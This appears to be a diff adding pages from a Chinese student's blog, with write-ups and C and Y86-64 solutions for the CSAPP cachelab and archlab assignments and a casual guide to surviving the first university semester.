+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:36:58" itemprop="dateModified" datetime="2022-06-19T09:36:58+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          ~~理论上还有第个perflab....~~
+
+## Part A
+
+之前寒假的时候beginend说过cachelab很难，但是感觉做下来还行？也可能是他把malloclab记错成了cachelab也说不定(
+
+不管了。Part A就是要按照书上cache memory的组织结构写一个简单的判断器，即给定若干读和写，来判断每次对内存的操作是/否命中缓存。事实上开一个三维数组就好了(如果不实现Blocks甚至只需要二维)
+
+不过这一次还是学到很多东西的，这里罗列一下
+
+1. `getopt()`函数，这个函数来自`unistd.h`或直接是`getopt.h`，两者选哪一个取决于C的标准。这个函数实现了从`argc, argv`中一个一个取出参数的功能，并且提供了[必选参数/可选参数/单独参数]三类参数的提取，很好用。如果有类似`--debug`这样的参数可能要用上`long_getopt()`之类的函数
+2. `strtok()`函数，这个最早见到是在PA lab里面。可以理解为`split()`函数
+3. `sscanf()`和`atoi()`，这个可以把字符串转数字。根据数字的进制选择用不用`sscanf`。事实上还有类似的`atof()`、`itoa()`、`sprintf()`这样的函数。多看官方文档~
+4. `calloc()`类似于`malloc()`，区别在于`calloc()`会初始化分配的内存为`0`，常用与数组(回想一下数组的默认初始化)
+
+个人觉得库函数还是很好用的，至少比自己写要精炼得多了。看来还是要多研究研究别人造过的轮子啊
+
+
+
+难点大概就在于`getopt()`和如何优雅地取出对应的位，还有就是对`M`操作的处理。这些都不算太难，写就完了。注意LRU的策略指的是最后一次访问最早的先被删。
+
+```c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <getopt.h>
+#include <stdbool.h>
+
+#include "cachelab.h"
+
+#define CMD_ARGS "h::v::s:E:b:t:"
+#define INF 0x7FFFFFFF
+
+typedef long long LL;
+
+typedef struct {
+	int *block;
+	int sign, last;
+	bool used;
+} Set;
+
+Set **Line;
+
+int s, E, b, S, B;
+int hit_cnt, miss_cnt, evict_cnt;
+
+char *filename;
+
+bool debug = false;
+
+void output(char *s) {
+	if (debug) printf("%s", s);
+}
+
+void hit() {
+	output("hit ");
+	++ hit_cnt;
+}
+
+void miss() {
+	output("miss ");
+	++ miss_cnt;
+}
+
+void evict() {
+	output("eviction "); 
+	++ evict_cnt;
+}
+
+FILE *openFile(char *filename) {
+	FILE *fin = fopen(filename, "r");
+	if (fin == NULL) {
+		puts("Error: file not found");
+		exit(-1);
+	}
+	return fin;
+}
+
+void update(int cur_time, int set_no, int block_offset, int sign, int wsiz) {
+	int rec = -1, rec_last = INF;
+	for (int i = 0; i < E; ++ i) {
+		Set *tmp_line = &Line[set_no][i];
+		if (!tmp_line->used) {
+			rec = i;
+			break;
+		}
+		if (tmp_line->last < rec_last) {
+			rec_last = tmp_line->last;
+			rec = i;
+		}
+	}
+	Line[set_no][rec].last = cur_time;
+	Line[set_no][rec].sign = sign;
+
+	if (Line[set_no][rec].used) {
+		evict();
+	} else {
+		Line[set_no][rec].used = true;
+	}
+}
+
+bool load(int cur_time, int set_no, int block_offset, int sign, int wsiz) {
+	for (int i = 0; i < E; ++ i) {
+		Set *tmp_line = &Line[set_no][i];
+		if (tmp_line->used && tmp_line->sign == sign) {
+			tmp_line->last = cur_time;
+			hit();
+			return true;
+		}
+	}
+
+	miss();
+	update(cur_time, set_no, block_offset, sign, wsiz);
+	return false;
+}
+
+void process(FILE *fin) {
+	char *cmd = (char *)malloc(51 * sizeof(char));
+	char *tmp_cmd = cmd;
+	int cur_time = 0;
+	for (fgets(cmd, 30, fin); !feof(fin); cmd = tmp_cmd, fgets(cmd, 30, fin)) {
+		if (cmd[0] == 'I') continue;
+		while ( (*cmd) == ' ') cmd ++;
+		cur_time ++;
+		cmd[strlen(cmd) - 1] = '\0';
+
+		char *type = strtok(cmd, " ,");
+		char *addr = strtok(NULL, " ,");
+		char *wsiz = strtok(NULL, " ,");
+
+		int wsiz_n = atoi(wsiz);
+		LL addr_n; sscanf(addr, "%llx", &addr_n);
+
+		if (debug) printf("%s %llx,%s ", type, addr_n, wsiz);
+
+		int block_offset = addr_n & (B - 1);
+		int set_no = (addr_n >> b) & (S - 1);
+		int sign = (addr_n >> (s + b) );
+
+		load(cur_time, set_no, block_offset, sign, wsiz_n);
+		if (type[0] == 'M') {
+			load(cur_time, set_no, block_offset, sign, wsiz_n);
+		}
+		output("\n");
+	}
+	printSummary(hit_cnt, miss_cnt, evict_cnt);
+}
+
+void init() {
+	Line = malloc(S * sizeof(Set *));
+	for (int i = 0; i < S; ++ i) {
+		Line[i] = malloc(E * sizeof(Set));
+		for (int j = 0; j < E; ++ j) {
+			Line[i][j].block = malloc(B * sizeof(int));
+			Line[i][j].used = false;
+		}
+	}
+}
+
+int main(int argc, char *const *argv) {
+	char *filename;
+	for (int opt; ~(opt = getopt(argc, argv, CMD_ARGS)); ) {
+		switch (opt) {
+			case 's': {
+				s = atoi(optarg);
+				S = 1 << s;
+				break;
+			}
+			case 'E': {
+				E = atoi(optarg);
+				break;
+			}
+			case 'b': {
+				b = atoi(optarg);
+				B = 1 << b;
+				break;
+			}
+			case 't': {
+				filename = optarg;
+				break;
+			}
+			case 'v': {
+				debug = true;
+			}
+		}
+	}
+
+	init();
+
+	process(openFile(filename));
+	return 0;
+}
+```
+
+## Part B
+写死我了...
+
+一个最naive的优化就是视频中说的blocking，通过恰当分块就可以实现高效利用cache
+对于32x32的问题，答案很简单就是分成8x8的块，61x67的也类似，难的在于64x64
+
+难点在于：一次访存会加载连续8个元素，而访问行数大于4时就会出现thrashing，因此用8x8的block会thrashing，用4x4的block则利用不充分
+最后是看了别人的解析才会做的，具体可以看这篇[https://www.cnblogs.com/liqiuhao/p/8026100.html](https://www.cnblogs.com/liqiuhao/p/8026100.html)
+大概意思就是把8x8分成四个4x4，每次用4x8的方式移动，这样是坠吼的
+```c
+/* 
+ * transpose_submit - This is the solution transpose function that you
+ *     will be graded on for Part B of the assignment. Do not change
+ *     the description string "Transpose submission", as the driver
+ *     searches for that string to identify the transpose function to
+ *     be graded. 
+ */
+char transpose_submit_desc[] = "Transpose submission";
+void transpose_submit(int M, int N, int A[N][M], int B[M][N])
+{
+    int t0, t1, t2, t3, t4, t5, t6, t7, t8;
+    if (M == 64) {
+        for (int si = 0; si < N; si += 8) {
+            for (int sj = 0; sj < M; sj += 8) {
+                for (int i = si; i < si + 4; ++ i) {
+                    t0 = A[i][sj];
+                    t1 = A[i][sj + 1];
+                    t2 = A[i][sj + 2];
+                    t3 = A[i][sj + 3];
+                    t4 = A[i][sj + 4];
+                    t5 = A[i][sj + 5];
+                    t6 = A[i][sj + 6];
+                    t7 = A[i][sj + 7];
+
+                    B[sj][i] = t0;
+                    B[sj + 1][i] = t1;
+                    B[sj + 2][i] = t2;
+                    B[sj + 3][i] = t3;
+                    B[sj][i + 4] = t7;
+                    B[sj + 1][i + 4] = t6;
+                    B[sj + 2][i + 4] = t5;
+                    B[sj + 3][i + 4] = t4;
+                }
+                for (int j = 0; j < 4; ++ j) {
+                    t0 = A[si + 4][sj + j + 4];
+                    t1 = A[si + 5][sj + j + 4];
+                    t2 = A[si + 6][sj + j + 4];
+                    t3 = A[si + 7][sj + j + 4];
+
+                    t4 = A[si + 4][sj + 3 - j];
+                    t5 = A[si + 5][sj + 3 - j];
+                    t6 = A[si + 6][sj + 3 - j];
+                    t7 = A[si + 7][sj + 3 - j];
+
+                    B[sj + j + 4][si] = B[sj + 3 - j][si + 4];
+                    B[sj + j + 4][si + 1] = B[sj + 3 - j][si + 5];
+                    B[sj + j + 4][si + 2] = B[sj + 3 - j][si + 6];
+                    B[sj + j + 4][si + 3] = B[sj + 3 - j][si + 7];
+
+                    B[sj + 3 - j][si + 4] = t4;
+                    B[sj + 3 - j][si + 5] = t5;
+                    B[sj + 3 - j][si + 6] = t6;
+                    B[sj + 3 - j][si + 7] = t7;
+                    B[sj + j + 4][si + 4] = t0;
+                    B[sj + j + 4][si + 5] = t1;
+                    B[sj + j + 4][si + 6] = t2;
+                    B[sj + j + 4][si + 7] = t3;
+                }
+            }
+        }
+    } else if (M == 61) {
+        for (int si = 0; si < N; si += 13) {
+            for (int sj = 0; sj < M; sj += 8) {
+                for (int i = si; i < si + 13 && i < N; ++ i) {
+                    for (int j = sj; j < sj + 8 && j < M; ++ j) {
+                        t0 = A[i][j];
+                        B[j][i] = t0;
+                    }
+                }
+            }
+        }
+    } else if (M == 32) {
+        for (int si = 0; si < N; si += 8) {
+            for (int sj = 0; sj < M; sj += 8) {
+                for (int i = si; i < si + 8; ++ i) {
+                    t1 = A[i][sj];
+                    t2 = A[i][sj + 1];
+                    t3 = A[i][sj + 2];
+                    t4 = A[i][sj + 3];
+                    t5 = A[i][sj + 4];
+                    t6 = A[i][sj + 5];
+                    t7 = A[i][sj + 6];
+                    t8 = A[i][sj + 7];
+
+                    B[sj][i] = t1;
+                    B[sj + 1][i] = t2;
+                    B[sj + 2][i] = t3;
+                    B[sj + 3][i] = t4;
+                    B[sj + 4][i] = t5;
+                    B[sj + 5][i] = t6;
+                    B[sj + 6][i] = t7;
+                    B[sj + 7][i] = t8;
+                }
+            }
+        }
+    }
+}
+```
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/03/07/CSAPP%E5%AE%9E%E9%AA%8C5-cachelab/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/19/%E5%A4%A7%E4%B8%80%E4%B8%8A%E5%AD%98%E6%B4%BB%E7%BB%8F%E9%AA%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/02/19/%E5%A4%A7%E4%B8%80%E4%B8%8A%E5%AD%98%E6%B4%BB%E7%BB%8F%E9%AA%8C/" class="post-title-link" itemprop="url">大一上存活经验</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-02-19 14:50:00" itemprop="dateCreated datePublished" datetime="2021-02-19T14:50:00+08:00">2021-02-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:36:58" itemprop="dateModified" datetime="2022-06-19T09:36:58+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          ## 大一上存活经验
+
+希望能给下一届的小朋友留点存活经验，毕竟俺也没有真正意义上的直系学长....真是残念
+
+现在有点怕明年没有直系学弟学妹了（悲
+
+### 九月
+
+开学前几天就到了南京，热得一言难尽。晚上骑车去了鼓楼新街口，宇宙中心.jpg
+
+宿舍分配很迷，18是填表配对、19是生日配对、20是生源地配对，导致我带去的土特产无人稀罕。感觉怎么想都是18科学啊（摔
+
+军训据说水分单调递增，时间甚至只有两周，唯一的困难在于早起。期待了很久的打靶只用上了电子枪，军训的话人均85，神枪手和优秀营员会有加分
+
+中途还下了几天的雨，就呆在宿舍里睡了
+
+买了支x宝的单车月卡，感觉还比较划算。
+
+---
+
+在军训途中溜去了二次选拔，不得不说zs老湿气氛能力一流。前几天就被软院群里浩瀚的往年题和答案吓到了，因此看了一圈还是去了信计，怎么都不会比软院更坑吧.jpg
+
+拔尖和羟基是分开考的，一轮下来数学物理语文英语都来了。想了想物理肯定干不过物竞的，最后确实录了一堆物理人，迷惑。
+
+面试的时候问了一堆奇怪的问题（当时还没有意识到我前面坐着的是frr）：“你是广东的啊，会说粤语吗”“有啥爱好？还挺少见”“你是软院的学生，能说说两边培养的区别吗”
+
+瞎扯了几句就溜了，回去的时候慢慢悠悠反正请了半天假。
+
+最后当然还是录上了。早知道这样为啥一开始不来南京面试呢（疑惑
+
+---
+
+20年的英语分级考试是线上考的。考试的设置让人摸不着头脑：听力进度条可以随便拖，但是听力部分的总时长有限制。我对着进度条来回对答案，还剩一题的时候突然就变成阅读了。这导致最后20min对着屏幕右下角的人脸发呆，然后意识到那张脸原来是我的orz
+
+分级的话能去一层次就去吧，不然还是交白卷去三层次摸鱼好。这种课比较看老湿，但是二层老师榜上一片黑就离谱QAQ
+
+---
+
+在招新群里混了一个社团，晚上直接去了根据地面基。感觉良好，还挺喜欢这个氛围的
+
+剩下的不太记得了....
+
+### 十月
+
+国庆和网友去了一趟鼓楼拍照打卡，软院的学生吐槽软院院楼.jpg，NTR人狂喜
+
+国庆晚上会有操场电影放映，约人草地游也非常不错，当然如果想认认真真看电影还是算了，比较考验单身狗在情侣面前的脸皮厚度
+
+二号的时候响应网友号召去了一趟漫展，结果场子很小，人也很少。不过年轻人非常多（废话），看pljj还是不错的
+
+还有定向越野之类的活动，顺便也去玄武湖转了转。
+
+五号的时候新电脑到了，还专门在工作室来了个开箱、换硬盘。不得不说还是15寸适合俺
+
+七号被安排了参观校史馆。只能说圣遗物比较有看头，大家争相合影留念。这个也要看讲解老湿，哪里人多往哪里靠就好了~
+
+---
+
+随便跟znr、wky组了个队去打ACM，三个人场上日常懵逼状态，通常是要么机子没人碰，要么三个人抢键盘.....
+
+大概看了看自己的水准觉得需要开始打CF了，结果半夜开了一把给我睡着了...第二天还是早八，醒来整个人都是懵的
+
+就再没打过即时比赛
+
+---
+
+社团招新的时候已经被当成牛马使用了，奇观：用剪网线吸引小情侣来展位。从此接网线代替钓鱼成为你社招牌活动
+
+十月下旬的时候接了人生第一个维修单。本来以为是尸检结果机子给复活了，中途出现了一堆奇奇怪怪的责任问题，最后还是机主爽快重买解决了问题。还是不够成熟...
+
+### 十一月
+
+双十一买了一把带靠背的椅子，神器！还买了一点衣服，希望可以学会穿搭吧...
+
+小姿势：理发一般近一点就在不靠谱的阿玛尼，远一点的话可以去靠谱的四组团。剪前阿玛尼剪后尼玛阿 不是说着玩的
+
+罗森的饭团很方便，周四满课的中午就靠这个活下去了
+
+一般这个时候枫叶开始红，可以约着出去公园玩，虽然俺没有被约过....
+
+
+
+### 期中
+
+期中只考了数分、高代、英语
+
+数分就没什么好说的，老范出题毕竟还是很温和。往年题也有，拿来做做再把教材的习题写完就差不多了，难度大概就作业级别吧
+
+高代改分就很迷，所有人都出现了估分差，助教甚至在归纳法的严格写法上设置了扣分点
+
+英语提前一周开始背单词做往年题就行，如果追求90+就背背课文，看着哪个是课本单词选就完事了....
+
+
+
+### 十二月
+
+中旬的时候下雪了，还专门出门感受了一下。操场上会有堆雪人，可以约着出去玩
+
+冬天必备羽绒，一定要带个帽子那种。手套也是神器，买薄一点就行，骑单车的时候就知道有多舒服了。广东人瑟瑟发抖.jpg
+
+冬天洗澡非常麻烦，那些赤膊下楼洗澡的都是抗冻猛士，我只敢打两桶热水用洗澡精灵。
+
+从yjy那里嫖来一张迎新晚会的门票，确实水平要比高中晚会高到不知道哪里去了。然而坑爹的地方在于参加晚会需要1. 转发集赞 2. 排队拿票 3. 抽时间去看
+
+通常第一步就把我劝退了，排队更是磨人....以后再尽量找时间去吧。当然如果有关系和内部人员PY也是十分OK的
+
+十二月的最后一周都在干饭，和不同的人在不同的地方干饭，总之很快乐就是了。痛苦都是钱包的
+
+跨年那天点了炸鸡外卖在工作室喝啤酒用投影仪看B站晚会，鉴于晚会的效果其实当天气氛有点尴尬
+
+### 一月
+
+所谓考试周就是在课程结束后专门用来考试的一段时间。在考试周理论上你是自由的。
+
+考试周前就一直在看导论，在图书馆借了rosen的书、cantor的书、各种各样的书....顺便把课文和单词给背了
+
+告诫后人：单词一定不要拖到最后一周来背，除非你的舍友也这么做（指可以陪着你一起背....
+
+9号的时候去了一次阅读的线下课，在南博看花鸟画。个人觉得很有意思。当然得有老湿在一边解释俺才能看出妙处来，不然就有点困
+
+考完了还和ltygg、gcxgg出去吃烤肉打羽毛球，感觉这才是大学生活啊kora
+
+在15号晚收了一台2k显示器，有点爽的
+
+### 期末
+
+你南的GPA有点独特，俺还没有摸清楚各种GPA的用处，等暑假再填坑（一定
+
+#### 数分 4.6
+
+5学分，太哈人了.jpg
+
+数分应该是作业只要交了就給满平时分的，上课也不点名
+
+期末就是原题大作战，难点在于前面的定义做法。压轴的甚至是危机昏的往年题，凭记忆写出来就完事了
+
+期中给了94，感觉是期末哪里写挂了，但是又不知道具体哪里写挂了....不管了
+
+数分的话好好看书，推推定理就差不多。网课和辅助教材推荐陈纪修，老范上课用的是梅加强的数分教材（毕竟是数学系的），如果觉得不够可以去看那本（
+
+你专业的数学甚至只是通修课，离谱
+
+#### 高代 4.5
+
+期末特别离谱，frr直接丢来一道IMO原题强行正态分布
+
+更离谱的是提前交卷人，jjppp被开除人籍.jpg
+
+高代还是教材不太行，但是丘维声的那本又有点厚....我觉得可以两边对着看，反正内容都在小本里，证明就看大本的就好了
+
+习题看着做吧，反正frr留的都是计算，有啥用啊（摔
+
+#### 导论 4.4
+
+这门课很难，但是考试远没有你想象中那么难（迫真
+
+我觉得前半学期可以说是难度顶天了，后半学期的递归方程和渐进复杂度都还好说
+
+难点主要在理解和应用吧（废话，主要是从“序”的引入开始就变得鬼畜了，中间$\omega$的部分还可以理解，到了transfinite induction就已经完全掉线了....
+
+没啥好说的，这个可以看看其他学校数学系公理集合论的的讲义（md题目甚至可以从拓扑学实分析课本里出出来，我不做人啦.jpg），有一本小绿色的俄国人写的书上的习题还挺有意思的，康拓的书也可以看看（不过只能拿来形象理解了...），习题课嘛.....别睡着就好了
+
+考试的时候放掉了一道水题，悔恨的泪是咸的（掀桌
+
+#### 实验 4.8
+
+twnb！
+
+所谓的试验就是程设基础+stl大杂烩，这个有手就行。当然有一些关于内存的小姿势要自己看看，这个看CSAPP就差不多了，寒假再看也行（吧
+
+最后是没有考试、平时课后有<=3题的小作业、期末有一个造小游戏的大作业，随便卷卷就好了。唯一的槽点在于助教，数据实在太水了....
+
+#### 听说读写 4.5
+
+听说没啥好说的，全凭老湿选的好。读写坑比较多
+
+读写一般会有课后作业，事情多的会两三周就一篇文章啥的。上课还有尴尬的点名提问，在回答了几次之后还会在冷场时求助你的救场....
+
+期末听说比较难，主要是听不清的问题（囧，这个莫得办法，最好还是对着原文过一遍课本的听力
+
+读写的难点在于那个B级词汇，我反正是弃疗任选，毕竟只背了A级词汇....
+
+#### 思修 4.2
+
+lbj思修画重点还行，重点特别多（有好多划出来迷惑人却不考的重点...
+
+实践是群友临时组了个队，最后一周1w字的报告1人1k，找个人上台，找个人做问卷就刚好12人的工作量了。也没有特别上心，还挺划算的吧...
+
+考前一周都在背重点，俺还简略地抄了一些在本子上，然鹅还是出现了不入脑的情况，不管了....
+
+平心而论感觉这个分有点低，问了一圈貌似大家都不高，可能是今年压分了（我瞎说的
+
+#### 羽毛球 4.5
+
+这学期突然说要跑2k4就离谱，还要计入期末成绩，这是向某体校看齐吗
+
+最后看着表压线跑完了13'30''的及格成绩，没啥好说的
+
+羽毛球期末还算友好，发发球、对打一下就过了，认真练练买点好球也能高分过
+
+体测就不说了，都是泪=_=!
+
+#### 一些通识课
+
+通识课需要1. 看脸 2. 手速。本非酋通识课第一轮只中了~~几乎是送的~~软工导学，离谱。后面学到了把笔记本屏幕竖起来抢课的姿势，这样就不用划到底才能确认了（惨
+
+开放抢通识的时候没有太在意，想起来去看的时候才发现已经莫得选了。建议早点蹲蹲抢点网课，在宿舍看视频他不香吗。
+
+俺的通识都是乱选的，也没有特意看过榜，这里也仅供参考
+
+
+
+软工导学好评，平时不点名，期末交论文。即使是听故事也很有趣，人多也方便写作业啥的，还可以抱周围的大腿（毕竟软工认识的人比较多，最后4.25
+
+地理信息系统好评，期末交论文，只有最后一节课点名，平时课堂很催眠，报告厅的椅子很好睡觉。认真听也可以得到一点小知识，还可以体验一波转码农的洗脑传教（雾，最后也是4.25
+
+科学之光的微结构光子。现工院开的课，平时的课程比较有意思但是讲课很尴尬，可能这些大佬都不怎么给本科生上课了。这课第三周公布考核方式，第八周增加作业论文数量，结课前一周宣布增加开卷考试环节，鼓励提问加分、论文数量加分、多劳多得，也就是内卷加分。最后开卷的题目是写一写对课程的理解和建议，我直接把论文又抄了一遍....何必呢。不过给分还行，最后是4.55
+
+---
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/02/19/%E5%A4%A7%E4%B8%80%E4%B8%8A%E5%AD%98%E6%B4%BB%E7%BB%8F%E9%AA%8C/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/17/CSAPP%E5%AE%9E%E9%AA%8C4-archlab/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/02/17/CSAPP%E5%AE%9E%E9%AA%8C4-archlab/" class="post-title-link" itemprop="url">CSAPP实验4: archlab</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-02-17 00:48:00" itemprop="dateCreated datePublished" datetime="2021-02-17T00:48:00+08:00">2021-02-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:36:58" itemprop="dateModified" datetime="2022-06-19T09:36:58+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          ~~留坑待填，还没看课本（囧~~
+
+
+
+照例说一下前置姿势
+
+本次实验最大的难点估计在于配置实验环境，找了一整天的搜索引擎发现还是出墙香.....我在本次实验中遇到了如下情况：
+
+![](https://img2020.cnblogs.com/blog/1010529/202102/1010529-20210219015459676-1512313102.png)
+
+
+
+想了很久都想不到要怎么解决，翻了翻`yas.h`甚至没有`#ifndef`，总不可能是CMU的人写错了？
+
+最后还是在Stack Overflow上翻到了这样一篇解决方案：[戳这里](https://stackoverflow.com/questions/63152352/fail-to-compile-the-y86-simulatur-csapp)
+
+如果出不了墙可以看[这里的解释](https://www.cnblogs.com/cnpirate/p/3254879.html)中的`-fno-common`条目。在本次实验中只需要知道这是GCC在某次版本更新后改变了默认的编译选项造成的，要正确make只需要在**所有的**`Makefile`中的编译开关加入`-fcommon`就好了，实测要加的文件有两个、共三处
+
+然后flex和bison是肯定要装的，这里CMU的老湿们实际上实现了一个小小的编译器（废话），想到我半死不活的C--，大佬还是太强大了OTZ
+
+如果想要帅气的GUI还需要做一些修正，反正俺没用上....不管了（摔
+
+最后编译成功会有一大段的显示
+
+## Part A
+
+---
+
+#### sum.ys
+
+这里的`.ys`应该是`Y86_64`的`.s`，`.yo`就是`Y86_64`的`.o`辣
+
+小彩蛋：你甚至能在VSCode中搜索到Y86的语法高亮，sublime屑
+
+感觉没啥好讲的，实在不行GCC一下再翻译成Y86就完事了，当然一眼看出来也很行
+
+我还做了寄存器的存档，看了看别人的代码貌似都没有....不过反正只有一个有用的函数，意会一下就好了
+
+由于语法检测是CMU自己做的，因此文件最后要多一个换行（这有因果关系吗喂
+
+```
+# jjppp 20
+
+# execution begins at address 0x0
+	.pos 0x0
+	irmovq stack,%rsp
+	call main
+	halt
+
+# a sample linked list
+.align 8
+ele1:
+	.quad 0x00a
+	.quad ele2
+ele2:
+	.quad 0x0b0
+	.quad ele3
+ele3:
+	.quad 0xc00
+	.quad 0
+
+# implementation of sum_list
+# list_ptr ls in %rdi
+sum_list:
+	pushq %rdi
+	pushq %rbx
+	irmovq 0x0,%rax
+	jmp test
+	loop:
+		mrmovq (%rdi),%rbx
+		addq %rbx,%rax
+		mrmovq 0x8(%rdi),%rdi
+	test:
+		andq %rdi,%rdi
+		jne loop
+	popq %rbx
+	popq %rdi
+	ret
+
+main:
+	irmovq ele1,%rdi
+	call sum_list
+	ret
+
+# stack starts here and grows to lower addresses
+	.pos 0x200
+stack:
+
+```
+
+#### rsum.ys
+
+递归写起来就很好玩，说实话我是在写递归的时候想起来要储存寄存器的值得
+
+这个也没啥好说的，常规
+
+```
+# jjppp 20
+
+# execution begins at address 0x0
+	.pos 0x0
+	irmovq stack,%rsp
+	call main
+	halt
+
+# a sample linked list
+.align 8
+ele1:
+	.quad 0x00a
+	.quad ele2
+ele2:
+	.quad 0x0b0
+	.quad ele3
+ele3:
+	.quad 0xc00
+	.quad 0
+
+# implementation of rsum_list
+rsum_list:
+	andq %rdi,%rdi
+	je return
+	pushq %rbx
+		pushq %rdi
+			mrmovq 0x8(%rdi),%rdi
+			call rsum_list
+		popq %rdi
+
+		mrmovq (%rdi),%rbx
+		addq %rbx,%rax
+	popq %rbx
+	ret
+	return:
+		irmovq 0x0,%rax
+		ret
+
+main:
+	irmovq ele1,%rdi
+	call rsum_list
+	ret
+
+# stack starts here and grows to lower addresses
+	.pos 0x200
+stack:
+
+```
+
+#### copy.ys
+
+这个的难点在于运算符的优先级
+
+事实上`*t++`等价于`*(t++)`，和`(*t)++`的区别在于操作的对象和取值（废话
+
+然后照着翻译就好了，中途因为不能操作立即数和寄存器所以用到了很多`pushq`
+
+```
+
+# jjppp 20
+
+# execution begins at address 0x0
+	.pos 0x0
+	irmovq stack,%rsp
+	call main
+	halt
+
+.align 8
+# source block
+src:
+	.quad 0x00a
+	.quad 0x0b0
+	.quad 0xc00
+# destination block
+dest:
+	.quad 0x111
+	.quad 0x222
+	.quad 0x333
+
+# implementation of copy_block
+# long *src in %rdi, long *dest in %rsi
+# long len in %rdx
+copy_block:
+	pushq %rdi
+	pushq %rsi
+	pushq %rdx
+	pushq %rbx
+	pushq %rcx
+	pushq %r8
+	irmovq 0x0,%rax
+	irmovq 0x8,%rcx
+	irmovq 0x1,%r8
+	jmp test
+	loop:
+		mrmovq (%rdi),%rbx
+		addq %rcx,%rdi
+
+		rmmovq %rbx,(%rsi)
+		addq %rcx,%rsi
+
+		xorq %rbx,%rax
+		subq %r8,%rdx
+	test:
+		andq %rdx,%rdx
+		jne loop
+	popq %r8
+	popq %rcx
+	popq %rbx
+	popq %rdx
+	popq %rsi
+	popq %rdi
+	ret
+
+main:
+	irmovq src,%rdi
+	irmovq dest,%rsi
+	irmovq 0x3,%rdx
+	call copy_block
+	ret
+
+# stack starts here and grows to lower addresses
+	.pos 0x200
+stack:
+
+```
+
+至此`archlab`的part A就做完辣，先去睡觉了
+## Part B
+
+---
+
+这一部分我们要根据作业4.3的要求做一个`IADDQ`的指令
+实际上这个part非常简单，我觉得没啥可讲的....只要看完课本相关内容就好了，实在不行对着示意图看改改`hcl`就行
+在这里应该能体会到恰当的抽象和详细的文档能让让后续工作十分轻松这一点
+课本这一章真的好长啊岂可修
+
+![](https://img2020.cnblogs.com/blog/1010529/202102/1010529-20210221143841188-1152497579.png)
+
+## Part C
+
+---
+
+比较有挑战的一个部分，但是说白了就是卡常数嘛...
+C实际上是给出了一个流水线的`y86`模拟器和一个小汇编程序，你可以任意修改模拟器实现/汇编代码来尽可能降低`CPE`
+
+目前我做到了`Avg CPE: 8.66`的样子，也就是`36.7/60.0`的分数，勉勉强强及格吧。俺是真的不知道还能在哪里卡一卡了，等看完书再说！
+
+说一下我做了哪些事情：
+1. 实现指令`IADDQ`，这个很显然毕竟只要翻一翻`pipe-full.hcl`就可以看到注释的提示
+2. 用`IADDQ`替换`%rdi`、`%rsi`和`%rdx`的增减
+3. 循环展开了8层
+4. 去掉了一开始的赋值，毕竟默认寄存器初值都是0
+
+然后就没了....有空再写（一定不鸽
+
+明天就开学了，希望能活下去吧
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/02/17/CSAPP%E5%AE%9E%E9%AA%8C4-archlab/#more" rel="contents">
